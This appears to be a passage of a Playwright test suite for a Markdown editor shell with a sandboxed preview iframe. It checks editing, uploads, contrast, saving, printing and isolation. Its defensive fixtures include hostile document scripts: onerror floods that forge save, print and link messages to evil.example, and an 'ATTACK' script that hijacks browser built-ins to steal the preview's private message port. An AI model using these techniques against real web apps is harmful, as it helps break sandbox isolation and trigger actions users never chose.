        text: text,
        render: function (t) { return E.renderMarkdownPreview(t); },
        adapter: E.textareaAdapter(),
        hooks: { resolveAsset: function (p) { return window.__urls[p] || p; } },
        preview: { assets: false, debounceMs: 20 },
      });
      s.on('error', function (e) { window.__errs.push(e.source + ': ' + e.message); });
      window.shell_big = s;
    })()`);
    const f = await frameOf(p, 'Photos');
    await expect.poll(async () => f.evaluate('[].filter.call(document.querySelectorAll("#orz-doc img"), function (i) { return i.complete && i.naturalWidth > 0 && i.getAttribute("src").indexOf("blob:null/") === 0; }).length'), { timeout: 20_000 }).toBe(10);
    // the page's own blob: written in the text is not the host's to hand over: never read, never shared
    expect(await f.evaluate('document.querySelector("#orz-doc img[alt=own]").getAttribute("src").indexOf("blob:http")')).toBe(0);
    expect(await f.evaluate('document.querySelector("#orz-doc img[alt=own]").naturalWidth')).toBe(0);
    // type 11 characters, one render after another
    await p.evaluate('window.__lt = 0; new PerformanceObserver(function (l) { l.getEntries().forEach(function (e) { window.__lt = Math.max(window.__lt, e.duration); }); }).observe({ type: "longtask" })');
    await p.evaluate('(function () { var at = shell_big.getText().lastIndexOf("end"); shell_big.focus(); shell_big.select(at, at); })()');
    const t0 = Date.now();
    for (const ch of 'kkkkkkkkkk1') await p.keyboard.type(ch, { delay: 30 });
    await f.waitForFunction('document.getElementById("orz-doc").textContent.indexOf("kkkkkkkkkk1end") >= 0', undefined, { timeout: 20_000 });
    const caughtUp = Date.now() - t0 - 11 * 30;
    expect(caughtUp, 'preview behind typing (ms)').toBeLessThan(2000);
    expect(await p.evaluate('window.__lt'), 'longest task (ms)').toBeLessThan(1000);
    const sent = await p.evaluate('window.__sent') as Array<{ type: string; html: number; add: string[]; drop: string[] }>;
    const renders = sent.filter((m) => m.type === 'orz-preview-render');
    expect(renders.length).toBeGreaterThan(1);
    expect(Math.max(...renders.map((m) => m.html)), 'largest render HTML').toBeLessThan(20_000);
    const added = sent.flatMap((m) => m.add);
    expect(added.length).toBe(10); // each once, for all those renders
    expect(new Set(added).size).toBe(10);
    expect(added).not.toContain(await p.evaluate('window.__own'));
    // one picture taken out: released (dropped once), the others stay
    await p.evaluate('shell_big.setText(shell_big.getText().replace("![p3](assets/p3.svg)", "gone"))');
    await expect.poll(async () => (await p.evaluate('window.__sent') as typeof sent).flatMap((m) => m.drop), { timeout: 10_000 }).toEqual([await p.evaluate('window.__urls["assets/p3.svg"]')]);
    expect(await p.evaluate('window.__errs')).toEqual([]);
    expect(await p.evaluate('shell_big.root.querySelector("iframe").getAttribute("sandbox")')).toBe('allow-scripts');
    await p.close();
  }, 120_000);

  it('[E.48] shell.preview.context is the very render context the shell passes to render(text, ctx): a carrier\'s own surface resolving includes through it (previewIncludes) asks the host once per shell for what the preview already fetched (FC-19 §8.8 "once per shell"; slides confirming round E-L1)', async () => {
    const p = await open();
    const r = await p.evaluate(`(async function () {
      var E = window.OrzEditor, seen = null, asked = [];
      var s = E.createEditorShell(document.getElementById('a'), {
        text: '# Inc\\n\\n{{md-include parts/a.md}}\\n',
        render: function (t, ctx) { seen = ctx; return E.renderMarkdownPreviewWithIncludes(t, ctx); },
        adapter: E.textareaAdapter(),
        hooks: { fetchInclude: function (t) { asked.push(t); return Promise.resolve('included ' + t); } },
        preview: { assets: false, debounceMs: 20 },
      });
      await s.refreshPreview();
      var same = s.preview.context === seen && s.preview.context.cache instanceof Map;
      var inc = await E.previewIncludes(s.getText(), s.preview.context);
      var again = await E.previewIncludes(s.getText(), s.preview.context);
      s.destroy();
      return { same: same, asked: asked, a: inc.includes && inc.includes['parts/a.md'], b: again.includes && again.includes['parts/a.md'] };
    })()`);
    expect(r).toEqual({ same: true, asked: ['parts/a.md'], a: 'included parts/a.md', b: 'included parts/a.md' });
    await p.close();
  });

  it('[E.47] uploads named with spaces, non-ASCII letters or a percent sign show in the preview: the inserted Markdown is percent-encoded and resolveAsset receives exactly the path uploadAsset returned (assetPath decodes once), from the shell and from shell.preview.resolveAsset (slides confirming round E-M1)', async () => {
    const p = await open();
    await p.evaluate(`(function () {
      var E = window.OrzEditor;
      window.__urls = {};
      window.__asked = [];
      var s = E.createEditorShell(document.getElementById('a'), {
        text: '# Uploads\\n\\n',
        render: function (t) { return E.renderMarkdownPreview(t); },
        adapter: E.textareaAdapter(),
        hooks: {
          uploadAsset: function (f) { var path = 'assets/' + f.name; window.__urls[path] = URL.createObjectURL(f); return Promise.resolve(path); },
          resolveAsset: function (p) { window.__asked.push(p); return window.__urls[p] || 'missing:' + p; },
        },
        preview: { assets: false, debounceMs: 20 },
      });
      window.shell_up = s;
    })()`);
    const svg = (w: number) => `<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="20"><rect width="10" height="10"/></svg>`;
    const r = await p.evaluate(`(function () {
      var mk = function (n, w) { return new File([${JSON.stringify(svg(31))}.replace('31', String(w))], n, { type: 'image/svg+xml' }); };
      shell_up.select(shell_up.getText().length, shell_up.getText().length);
      return shell_up.uploadAssets([mk('Screen Shot 1.svg', 41), mk('图表.svg', 42), mk('100% (final).svg', 43)]);
    })()`) as { ok: boolean; inserted: string[] };
    expect(r.ok).toBe(true);
    expect(r.inserted).toEqual(['![Screen Shot 1](assets/Screen%20Shot%201.svg)', '![图表](assets/图表.svg)', '![100% (final)](assets/100%25%20%28final%29.svg)']);
    const f = await frameOf(p, 'Uploads');
    await expect.poll(async () => f.evaluate('[].map.call(document.querySelectorAll("#orz-doc img"), function (i) { return i.complete ? i.naturalWidth : -1; }).join(",")'), { timeout: 10_000 }).toBe('41,42,43');
    const asked = new Set(await p.evaluate('window.__asked') as string[]);
    expect([...asked].sort()).toEqual(['assets/100% (final).svg', 'assets/Screen Shot 1.svg', 'assets/图表.svg']);
    // a carrier's own reference (a slide background) is asked the same way
    expect(await p.evaluate('shell_up.preview.resolveAsset("assets/Screen%20Shot%201.svg") === window.__urls["assets/Screen Shot 1.svg"]')).toBe(true);
    expect(await p.evaluate('shell_up.preview.resolveAsset("assets/图表.svg") === window.__urls["assets/图表.svg"]')).toBe(true);
    expect(await p.evaluate('shell_up.preview.resolveAsset("https://x.test/a.png")')).toBe('https://x.test/a.png');
    expect(await p.evaluate('shell_up.preview.resolveAsset("bad%E0%A4%A.png")')).toBe('missing:bad%E0%A4%A.png'); // a malformed escape: as written
    await p.close();
  });

  it('[E.13] [E.1] [E.5] [E.7] [E.4] two shells mount CodeMirror 6 from the pinned bundle (one SRI-checked script for the page), typing keeps each document\'s exact form, and the sandboxed previews update — the document\'s scripts run there but cannot reach the host page', async () => {
    const p = await open();
    expect(await mountBoth(p)).toEqual([{ engine: 'codemirror6', error: null }, { engine: 'codemirror6', error: null }]);
    expect(await p.evaluate('[].map.call(document.querySelectorAll("script[data-orz-editor]"), function (s) { return [s.integrity, s.crossOrigin]; })')).toEqual([[CODEMIRROR6_INTEGRITY, 'anonymous']]);
    expect(await p.evaluate('shell_a.getText() === ' + JSON.stringify(TEXT_A) + ' && shell_b.getText() === ' + JSON.stringify(TEXT_B))).toBe(true);
    // type in A
    const contentA = p.locator('#a .cm-content');
    await contentA.click();
    await p.keyboard.press('ControlOrMeta+End');
    await p.keyboard.type('Typed in A.');
    await p.keyboard.press('Enter');
    await p.keyboard.type('Second line');
    const a = await p.evaluate('shell_a.getText()') as string;
    expect(a).toBe(`${TEXT_A}Typed in A.\r\nSecond line`);
    expect(await p.evaluate('[shell_a.isDirty(), shell_b.isDirty(), shell_b.getText() === ' + JSON.stringify(TEXT_B) + ']')).toEqual([true, false, true]);
    // the preview of A updates; B's does not change
    const fa = await frameOf(p, 'Second line');
    expect(await fa.evaluate('document.querySelector("[data-src-line=\\"6\\"]").textContent')).toBe('Shell A');
    await frameOf(p, 'Line 79 of B.');
    // sandbox: exactly allow-scripts, opaque origin; the document's onerror ran and was refused the host
    const sandboxes = await p.evaluate('[shell_a, shell_b].map(function (s) { return s.root.querySelector("iframe").getAttribute("sandbox"); })');
    expect(sandboxes).toEqual(['allow-scripts', 'allow-scripts']);
    await p.waitForFunction('window.__probes.length > 0');
    const probe = (await p.evaluate('window.__probes[0]')) as Record<string, string>;
    expect(probe.doc).toBe('SecurityError');
    expect(probe.ls).toBe('SecurityError');
    expect(probe.mine).toBe('SecurityError'); // no storage of its own either (opaque origin)
    expect(await p.title()).toBe('host page');
    // the same script forged the frame's key and link messages: without the reader's activation they do nothing
    await p.waitForTimeout(200);
    expect(await p.evaluate('window.__saved.a.length')).toBe(0);
    expect(p.context().pages()).toHaveLength(1);
    // scroll sync on data-src-line anchors: B's editor scrolled to line ~120 brings the preview to "Line 59"; the preview scrolled back brings the editor up
    const fb = await frameOf(p, 'Line 79 of B.');
    await p.locator('#b .cm-content').hover();
    await p.evaluate(`(function () {
      var view = OrzCodeMirror6.view.EditorView.findFromDOM(shell_b.root.querySelector('.cm-editor'));
      var doc = view.state.doc, n = doc.toString().split('\\n').indexOf('Line 59 of B.') + 1;
      view.scrollDOM.scrollTop = view.lineBlockAt(doc.line(n).from).top;
    })()`);
    await expect.poll(async () => Number(await fb.evaluate('(document.scrollingElement || document.documentElement).scrollTop')), { timeout: 5000 }).toBeGreaterThan(100);
    // the paragraph at the top of the preview is the one at the top of the editor (CodeMirror settles its height estimates first)
    await expect.poll(async () => String(await fb.evaluate(`(function () {
      var y = (document.scrollingElement || document.documentElement).scrollTop, best = null;
      document.querySelectorAll('#orz-doc p').forEach(function (n) { var t = n.getBoundingClientRect().top + y; if (t <= y + 40) best = n.textContent; });
      return best;
    })()`)), { timeout: 5000 }).toMatch(/^Line (5[89]|60) of B\.$/); // within one paragraph
    await p.locator('#b iframe').hover();
    await p.waitForTimeout(400); // the pointer crossed B's editor on its way: past the 300 ms in which the editor leads (E.14)
    await p.mouse.wheel(0, -100000);
    await expect.poll(async () => Number(await p.locator('#b .cm-scroller').evaluate((el) => (el as HTMLElement).scrollTop)), { timeout: 5000 }).toBeLessThan(5);
    // the host page's CSS does not restyle the shell (shadow root)
    const style = await p.locator('#a .orz-editor__save').evaluate((el) => { const s = getComputedStyle(el); return [s.backgroundColor, s.fontSize]; });
    expect(style[0]).not.toBe('rgb(255, 0, 0)');
    expect(style[1]).toBe('13px');
    await p.close();
  });

  it('[E.27] syntax highlighting follows the chrome\'s scheme: in CodeMirror every Markdown token (headings, emphasis marks, links, URLs, code, quotes, comments, labels) is coloured by the --orz-chrome-syntax-* tokens, at a contrast of at least 4.5:1 on the editor background — measured in Chrome, light and dark', async () => {
    const p = await open();
    const text = '# Heading one\n\nSome *em*, **strong**, ~~gone~~, `code`, [link](https://x.example "Title") and <https://auto.example>.\n\n> A quote\n\n- item\n\n<!-- a comment -->\n\n```js\nlet x = 1;\n```\n\n---\n\n[ref]: https://ref.example\n';
    expect(await p.evaluate(`mountOpts('c', ${JSON.stringify(text)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    const measure = (scheme: string) => p.evaluate(`(function (scheme) {
      shell_c.root.host.setAttribute('data-chrome', scheme);
      var cv = document.createElement('canvas'); cv.width = cv.height = 1;
      var x = cv.getContext('2d', { willReadFrequently: true });
      function rgb(c) { x.clearRect(0, 0, 1, 1); x.fillStyle = '#000'; x.fillStyle = c; x.fillRect(0, 0, 1, 1); var d = x.getImageData(0, 0, 1, 1).data; return [d[0], d[1], d[2]]; }
      function lum(c) { return c.map(function (v) { v /= 255; return v <= 0.04045 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }).reduce(function (a, v, i) { return a + v * [0.2126, 0.7152, 0.0722][i]; }, 0); }
      function ratio(a, b) { var l1 = lum(a), l2 = lum(b); return (Math.max(l1, l2) + 0.05) / (Math.min(l1, l2) + 0.05); }
      var ed = shell_c.root.querySelector('.cm-editor');
      var bg = rgb(getComputedStyle(ed).backgroundColor);
      var out = {};
      shell_c.root.querySelectorAll('.cm-line [class*="orz-tok-"]').forEach(function (n) {
        var cls = String(n.className).split(/\\s+/).filter(function (c) { return /^orz-tok-/.test(c); }).join(' ');
        var r = ratio(rgb(getComputedStyle(n).color), bg);
        if (!(cls in out) || r < out[cls]) out[cls] = Math.round(r * 100) / 100;
      });
      return { bg: bg, ratios: out };
    })(${JSON.stringify(scheme)})`) as Promise<{ bg: number[]; ratios: Record<string, number> }>;
    const all = ['heading', 'em', 'strong', 'link', 'url', 'code', 'quote', 'comment', 'label', 'mark'];
    const complete = async (scheme: string) => {
      // CodeMirror highlights as its parser gets there: wait until every token kind of the text is drawn
      let m = await measure(scheme);
      for (let i = 0; i < 50 && !all.every((t) => Object.keys(m.ratios).join(' ').includes(`orz-tok-${t}`)); i++) { await p.waitForTimeout(100); m = await measure(scheme); }
      return m;
    };
    const light = await complete('light');
    const dark = await complete('dark');
    expect(light.bg[0]).toBeGreaterThan(200);
    expect(dark.bg[0]).toBeLessThan(80);
    for (const m of [light, dark]) {
      const seen = Object.keys(m.ratios).join(' ');
      for (const t of all) expect(seen, `${t} in ${JSON.stringify(m.ratios)}`).toContain(`orz-tok-${t}`);
      for (const [cls, r] of Object.entries(m.ratios)) expect(r, `${cls} on ${m.bg}`).toBeGreaterThanOrEqual(4.5);
    }
    process.stdout.write(`[E.27] contrast (lowest per class): ${JSON.stringify({ light: light.ratios, dark: dark.ratios })}\n`);
    await p.close();
  });

  it('[E.13] [E.3] [E.4] [E.8] modes, keyboard and save in Chrome: the Preview button and Cmd/Ctrl+\\ switch views, Cmd/Ctrl+S inside CodeMirror (and inside the preview frame) saves the exact text through hooks.save and clears dirty, undo returns the exact original, Esc leaves the editor', async () => {
    const p = await open();
    await mountBoth(p);
    const content = p.locator('#a .cm-content');
    await content.click();
    await p.keyboard.press('ControlOrMeta+End');
    await p.keyboard.type('!');
    await p.keyboard.press('ControlOrMeta+s');
    await p.waitForFunction('window.__saved.a.length === 1');
    expect(await p.evaluate('window.__saved.a[0]')).toBe(`${TEXT_A}!`);
    expect(await p.evaluate('[shell_a.isDirty(), window.__saved.b.length]')).toEqual([false, 0]);
    // the same shortcut pressed inside the preview frame (the reader is there) saves too
    await p.locator('#a iframe').click({ position: { x: 300, y: 20 } });
    await p.keyboard.press('ControlOrMeta+s');
    await p.waitForFunction('window.__saved.a.length === 2');
    expect(await p.evaluate('window.__saved.a[1]')).toBe(`${TEXT_A}!`);
    await content.click();
    await p.keyboard.press('ControlOrMeta+z');
    expect(await p.evaluate('shell_a.getText()')).toBe(TEXT_A);
    // setHeader is one undoable edit in CodeMirror too
    await p.evaluate('shell_a.setHeader({ title: "Renamed" })');
    expect(await p.evaluate('shell_a.getText()')).toBe(editHeader(TEXT_A, { title: 'Renamed' }));
    await content.click();
    await p.keyboard.press('ControlOrMeta+z');
    expect(await p.evaluate('shell_a.getText()')).toBe(TEXT_A);
    // views
    await p.locator('#a [data-mode="preview"]').click();
    expect(await p.evaluate('[shell_a.getView(), getComputedStyle(shell_a.root.querySelector(".orz-editor__pane--editor")).display]')).toEqual(['preview', 'none']);
    await p.locator('#a [data-mode="split"]').click();
    await content.click();
    await p.keyboard.press('ControlOrMeta+Backslash');
    expect(await p.evaluate('[shell_a.getMode(), getComputedStyle(shell_a.root.querySelector(".orz-editor__pane--preview")).display]')).toEqual(['editor', 'none']);
    await p.keyboard.press('Escape');
    expect(await p.evaluate('shell_a.root.activeElement && shell_a.root.activeElement.getAttribute("data-mode")')).toBe('editor');
    expect(await p.evaluate('shell_b.getMode()')).toBe('split');
    await p.close();
  });

  it('[E.13] [E.6] [E.4] [E.7] dragging the split sets the ratio (stored per uid), a reload restores it, a narrow shell shows one pane, and destroy() removes every listener and iframe it added', async () => {
    const p = await open();
    await mountBoth(p);
    const divider = p.locator('#a [role="separator"]');
    const box = (await divider.boundingBox())!;
    const panes = (await p.locator('#a .orz-editor__panes').boundingBox())!;
    await p.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await p.mouse.down();
    await p.mouse.move(panes.x + panes.width * 0.5, box.y + 50, { steps: 3 });
    await p.mouse.move(panes.x + panes.width * 0.3, box.y + 60, { steps: 5 });
    await p.mouse.up();
    const ratio = (await p.evaluate('shell_a.getSplitRatio()')) as number;
    expect(ratio).toBeGreaterThan(0.28);
    expect(ratio).toBeLessThan(0.32);
    const editorWidth = (await p.locator('#a .orz-editor__pane--editor').boundingBox())!.width;
    expect(editorWidth / panes.width).toBeCloseTo(ratio, 1);
    expect(await p.evaluate(`localStorage.getItem('orz-pref:${UID_A}:splitRatio')`)).toBe(String(ratio));
    expect(await p.evaluate('shell_b.getSplitRatio()')).toBe(0.5);
    await p.reload();
    await p.waitForFunction('typeof window.mount === "function"');
    await mountBoth(p);
    expect(await p.evaluate('[shell_a.getSplitRatio(), shell_b.getSplitRatio()]')).toEqual([ratio, 0.5]);
    // narrow: B's box becomes 500 px wide → one pane
    await p.evaluate('document.getElementById("b").style.width = "500px"');
    await p.waitForFunction('shell_b.getView() === "editor"');
    expect(await p.evaluate('[shell_b.getMode(), getComputedStyle(shell_b.root.querySelector(\'.orz-editor__mode[data-mode="split"]\')).display]')).toEqual(['split', 'none']);
    // destroy both: the page's window listeners are back to the count before mounting, no iframe is left
    const before = await p.evaluate('window.__listeners');
    expect(before).toBeGreaterThan(0);
    await p.evaluate('shell_a.destroy(); shell_b.destroy();');
    expect(await p.evaluate('window.__listeners')).toBe(0);
    expect(await p.evaluate('[document.querySelectorAll("iframe").length, document.getElementById("a").childElementCount, document.getElementById("b").childElementCount]')).toEqual([0, 0, 0]);
    await p.close();
  });

  it('[E.13] [E.20] a standalone file opened from disk (file:) shows the document\'s relative local images in the preview; an app host on the same file: page keeps the opaque frame, where they stay blank', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'orz-e20-'));
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAAEUlEQVR4nGP4z8DwHwyBDAAk8AP9eF9ZWQAAAABJRU5ErkJggg==', 'base64');
    writeFileSync(join(dir, 'fig.png'), png);
    writeFileSync(join(dir, 'editor.js'), editorJs);
    writeFileSync(join(dir, 'doc.md.html'), `<!doctype html><html><body><div id="s"></div><div id="a"></div><script src="editor.js"></script><script>
      var E = window.OrzEditor, text = '# Figure\\n\\n![fig](fig.png)\\n';
      var opts = function (extra) { return Object.assign({ text: text, render: function (t) { return E.renderMarkdownPreview(t); }, adapter: E.textareaAdapter(), preview: { assets: false, debounceMs: 10 } }, extra); };
      window.st = E.createEditorShell(document.getElementById('s'), opts({ assemble: function () { return ''; } }));
      window.ap = E.createEditorShell(document.getElementById('a'), opts({ hooks: { save: function () { return Promise.resolve(); } } }));
    </script></body></html>`);
    const page = await browser!.newPage();
    try {
      await page.goto(pathToFileURL(join(dir, 'doc.md.html')).href);
      const frames = () => page.evaluate(() => ['st', 'ap'].map((k) => (window as unknown as Record<string, { root: ShadowRoot }>)[k].root.querySelector('iframe')!.getAttribute('sandbox')));
      expect(await frames()).toEqual(['allow-scripts allow-same-origin', 'allow-scripts']);
      const width = (k: string) => page.evaluate((key) => {
        const f = (window as unknown as Record<string, { root: ShadowRoot }>)[key].root.querySelector('iframe')!;
        try { const d = f.contentDocument; if (!d) return -2; const img = d.querySelector('img'); return img && img.complete ? img.naturalWidth : -1; } catch { return -2; }
      }, k);
      await expect.poll(() => width('st'), { timeout: 15_000 }).toBe(4);
      expect(await width('ap')).toBe(-2); // opaque: the page cannot even look in
    } finally {
      await page.close();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('[E.13] [E.9] [E.11] a bundle whose bytes differ from the pinned integrity is refused by the browser: the shell keeps the textarea engine, reports the error, and still edits and saves', async () => {
    const p = await open();
    const r = await p.evaluate(`mount('c', ${JSON.stringify(TEXT_A)}, ${JSON.stringify(`${A}/cm6-tampered.js`)})`) as { engine: string; error: string | null };
    expect(r.engine).toBe('textarea');
    expect(r.error).toMatch(/could not be loaded/);
    expect(await p.evaluate('typeof window.OrzCodeMirror6')).toBe('undefined');
    await p.locator('#c textarea').click();
    await p.locator('#c textarea').evaluate((ta) => { const t = ta as HTMLTextAreaElement; t.setSelectionRange(t.value.length, t.value.length); });
    await p.keyboard.type('fallback');
    await p.keyboard.press('ControlOrMeta+s');
    await p.waitForFunction('window.__saved.c.length === 1');
    expect(await p.evaluate('window.__saved.c[0]')).toBe(`${TEXT_A}fallback`);
    expect(await p.evaluate('shell_c.getText()')).toBe(`${TEXT_A}fallback`);
    await p.close();
  });
  // ── round 1 of closed loop 2 ──
  const FLOOD = `<img src="x" onerror="setInterval(function(){var P=parent;P.postMessage({type:'orz-preview-key',key:'Escape'},'*');P.postMessage({type:'orz-preview-active'},'*');P.postMessage({type:'orz-preview-scrolled',top:0,max:1000},'*');P.postMessage({type:'orz-preview-key',key:'s'},'*');P.postMessage({type:'orz-preview-key',key:'\\\\\\\\'},'*');P.postMessage({type:'orz-preview-link',href:'https://evil.example/'},'*')},40)">`;
  const TEXT_SAVES = `# Saves\n\n<img src="x" onerror="setInterval(function(){parent.postMessage({type:'orz-preview-key',key:'s'},'*')},40)">\n\nLine 149.\n`;
  const TEXT_FLOOD = `{{nyml\nkind: document\nuid: ${UID_A}\n}}\n\n# Flood\n\n${FLOOD}\n\n${Array.from({ length: 150 }, (_, i) => `Line ${i}.\n`).join('\n')}`;

  it('[E.13] [E.14] a document script that floods Escape, "active", scroll, save, view and link messages while the reader types changes nothing: every keystroke arrives, focus and the scroll stay in the editor, nothing is saved or opened; with the reader in the frame (focus and activation fresh) its forged saves still do nothing, and the reader\'s own Cmd/Ctrl+S there saves once', async () => {
    const p = await open();
    expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_FLOOD)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    await frameOf(p, 'Line 149.');
    await p.locator('#a .cm-content').click();
    await p.keyboard.press('ControlOrMeta+End');
    const typed = 'typed while the frame floods';
    for (const ch of typed) { await p.keyboard.type(ch); await p.waitForTimeout(25); }
    await p.waitForTimeout(400);
    expect(await p.evaluate('shell_a.getText()')).toBe(`${TEXT_FLOOD}${typed}`);
    expect(await p.evaluate('shell_a.root.activeElement && shell_a.root.activeElement.className')).toContain('cm-content');
    expect(await p.locator('#a .cm-scroller').evaluate((el) => (el as HTMLElement).scrollTop)).toBeGreaterThan(1000);
    expect(await p.evaluate('[window.__saved.a.length, shell_a.getMode()]')).toEqual([0, 'split']);
    expect(p.context().pages()).toHaveLength(1);
    await p.close();
    // Round 2 (B-15 closed for the default bridge): the bridge's reports come only through its private port, from
    // trusted events, so with the reader in the frame — focus there, activation fresh — the document's forged saves
    // still do nothing, while the reader's own Cmd/Ctrl+S there saves once.
    const q = await open();
    await q.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_SAVES)}, ${JSON.stringify(`${A}/cm6.js`)})`);
    await frameOf(q, 'Line 149.');
    await q.locator('#a iframe').click({ position: { x: 300, y: 20 } });
    await q.waitForTimeout(1500);
    expect(await q.evaluate('[shell_a.root.activeElement === shell_a.root.querySelector("iframe"), window.__saved.a.length]')).toEqual([true, 0]);
    await q.keyboard.press('ControlOrMeta+s');
    await q.waitForFunction('window.__saved.a.length === 1');
    await q.waitForTimeout(600);
    expect(await q.evaluate('window.__saved.a.length')).toBe(1);
    expect(q.context().pages()).toHaveLength(1);
    await q.close();
  });

  const PRINT_FLOOD = `<img src="x" onerror="setInterval(function(){parent.postMessage({type:'orz-preview-key',key:'p'},'*')},40)">`;
  const TEXT_PRINT = `{{nyml\nkind: document\nuid: ${UID_A}\n}}\n\n# Print\n\n${PRINT_FLOOD}\n\n${Array.from({ length: 10 }, (_, i) => `Line ${i}.\n`).join('\n')}`;

  it('[E.13] [E.33] [E.14] Cmd/Ctrl+P with the focus in the preview frame reaches the host through the port (2.3.0, round 2 of the paged loop): with a print listener the shell emits print { source: "preview" } once and the host page does not print; the frame\'s own print is prevented; a document script flooding forged print keys changes nothing; Cmd/Ctrl+P in the editor emits print { source: "editor" }; without a listener the reader\'s Cmd/Ctrl+P in the frame prints the host page once (window.print)', async () => {
    const p = await open();
    await p.evaluate('window.__prints = []; window.__printed = 0; window.print = function () { window.__printed++; };');
    expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_PRINT)}, ${JSON.stringify(`${A}/cm6.js`)}, { print: true })`)).toEqual({ engine: 'codemirror6', error: null });
    const fa = await frameOf(p, 'Line 9.');
    // after the bridge's listener (document, bubbling): what the frame's own print would see
    await fa.evaluate("window.addEventListener('keydown', function (e) { if (e.key === 'p' || e.key === 'P') window.__pd = String(e.defaultPrevented); })");
    await p.locator('#a iframe').click({ position: { x: 300, y: 20 } });
    await p.waitForTimeout(500);
    expect(await p.evaluate('[window.__prints.length, window.__printed]')).toEqual([0, 0]); // the forged flood does nothing
    await p.keyboard.press('ControlOrMeta+p');
    await p.waitForFunction('window.__prints.length === 1');
    await p.waitForTimeout(500);
    expect(await p.evaluate('[window.__prints.join(), window.__printed]')).toEqual(['a:preview', 0]);
    await expect.poll(() => fa.evaluate('window.__pd'), { timeout: 10_000 }).toBe('true'); // the bridge prevented the frame's own print
    await p.locator('#a .cm-content').click();
    await p.keyboard.press('ControlOrMeta+p');
    await p.waitForFunction('window.__prints.length === 2');
    expect(await p.evaluate('[window.__prints.join(), window.__printed]')).toEqual(['a:preview,a:editor', 0]);
    // no listener: the reader's key in the frame prints the host page once (the flood still nothing)
    expect(await p.evaluate(`mountOpts('b', ${JSON.stringify(TEXT_PRINT.replace(UID_A, UID_B))}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    await p.waitForFunction('document.querySelector("#b") && shell_b.root.querySelector("iframe")');
    await p.waitForTimeout(800);
    await p.locator('#b iframe').click({ position: { x: 300, y: 20 } });
    await p.waitForTimeout(300);
    expect(await p.evaluate('window.__printed')).toBe(0);
    await p.keyboard.press('ControlOrMeta+p');
    await p.waitForFunction('window.__printed === 1');
    await p.waitForTimeout(500);
    expect(await p.evaluate('[window.__prints.length, window.__printed]')).toEqual([2, 1]);
    expect(p.context().pages()).toHaveLength(1);
    await p.close();
  });

  /**
   * 2.3.0 round 3 of the paged loop (E.35): a document script overrides a built-in the bridge uses —
   * MessageEvent getters, Event getters and methods, addEventListener, MessagePort methods,
   * Function.prototype.call/apply/bind, Reflect.apply, Object/JSON functions, Object.prototype getters, the
   * page hooks with a caller / stack walk, the timers and Date.now, the key/mouse getters and Element methods —
   * so that the shell's next message through the private port (a render, a carrier's message) hands it the
   * port (as `this`, an argument, or an event it can read the port from); with the port it posts forged keys
   * (save, print, view, Escape), a link, scrolls and input. `window.__got` records '[port]' when it got one.
   */
  const ATTACK = String.raw`(function(V){if(window.__atk)return;window.__atk=1;window.__got='';window.__hits=0;
var RA0=Reflect.apply,GOD=Object.getOwnPropertyDescriptor,DP0=Object.defineProperty,MPp=MessagePort.prototype,oPM=MPp.postMessage,
oT=GOD(Event.prototype,'target').get,oCT=GOD(Event.prototype,'currentTarget').get,oSE=GOD(Event.prototype,'srcElement').get,oPorts=GOD(MessageEvent.prototype,'ports').get,
oSI=setInterval,oST=setTimeout,busy=0;
function steal(p){if(window.__stolen)return;window.__stolen=p;window.__got+='[port]';var ks=['s','p','\\','Escape'];for(var i=0;i<ks.length;i++)RA0(oPM,p,[{type:'orz-preview-key',key:ks[i]}]);
RA0(oPM,p,[{type:'orz-preview-link',href:'https://evil.example/stolen'}]);RA0(oPM,p,[{type:'orz-preview-scrolled',top:0,max:100000}]);RA0(oPM,p,[{type:'orz-preview-scrolled',line:40}]);RA0(oPM,p,[{type:'orz-preview-active',input:'key'}])}
function scan(o,d){d=d||0;if(o===null||o===undefined||d>3||busy)return;busy=1;try{scan1(o,d)}finally{busy=0}}
function scan1(o,d){try{if(o instanceof MessagePort){steal(o);return}
if(o instanceof Event){var a=[RA0(oT,o,[]),RA0(oCT,o,[]),RA0(oSE,o,[])];if(o instanceof MessageEvent){var ps=RA0(oPorts,o,[]);for(var i=0;i<ps.length;i++)a.push(ps[i])}for(var k=0;k<a.length;k++)if(a[k] instanceof MessagePort)steal(a[k]);return}
if(typeof o==='object'&&typeof o.length==='number'&&!(o instanceof Node)&&o!==window){for(var j=0;j<o.length&&j<8;j++)scan1(o[j],d+1)}}catch(e){}}
function walk(){if(busy)return;busy=1;try{var f=walk.caller,n=0;while(f&&n++<30){try{var args=f.arguments;for(var i=0;args&&i<args.length;i++)scan1(args[i],0)}catch(e){}f=f.caller}}catch(e){}
try{var op=Error.prepareStackTrace;Error.prepareStackTrace=function(e,cs){for(var i=0;i<cs.length;i++){try{scan1(cs[i].getThis(),0)}catch(x){}try{var fn=cs[i].getFunction();if(fn&&fn.arguments)for(var j=0;j<fn.arguments.length;j++)scan1(fn.arguments[j],0)}catch(x){}}return ''};void new Error().stack;Error.prepareStackTrace=op}catch(e){}busy=0}
function hit(t,a){window.__hits++;var we=null;try{we=window.event}catch(e){}scan(we);scan(t);if(a)for(var i=0;i<a.length;i++)scan(a[i]);walk()}
function getter(proto,name){var d=GOD(proto,name);if(!d||!d.configurable)return;DP0(proto,name,{configurable:true,enumerable:d.enumerable,get:function(){hit(this);return d.get?RA0(d.get,this,[]):d.value},set:d.set?function(v){hit(this,[v]);return RA0(d.set,this,[v])}:undefined})}
function method(owner,name){var f=owner[name];if(typeof f!=='function')return;owner[name]=function(){hit(this,arguments);return RA0(f,this,arguments)}}
function hooks(){window.__orzPreviewApply=function(html){hit(null,arguments);document.getElementById('orz-doc').innerHTML=html};window.__orzPreviewMessage=function(m){hit(null,arguments)};window.__orzPreviewNavigate=function(){hit(null,arguments)};var e=window.__orzEnhance;window.__orzEnhance=function(){hit(null,arguments);if(typeof e==='function')return e()}}
